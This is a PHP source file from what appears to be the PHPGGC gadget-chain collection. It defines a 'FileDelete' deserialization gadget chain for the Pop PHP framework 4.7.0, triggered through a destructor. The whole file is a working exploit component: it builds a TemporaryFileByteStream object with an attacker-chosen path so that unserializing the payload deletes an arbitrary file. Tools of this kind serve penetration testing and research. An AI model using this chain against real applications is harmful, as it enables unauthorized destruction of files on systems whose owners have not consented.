<?php

namespace GadgetChain\PopPHP;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '4.7.0';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \Pop\Mail\Transport\Smtp\Stream\Byte\TemporaryFileByteStream($parameters['remote_path']);
    }
}
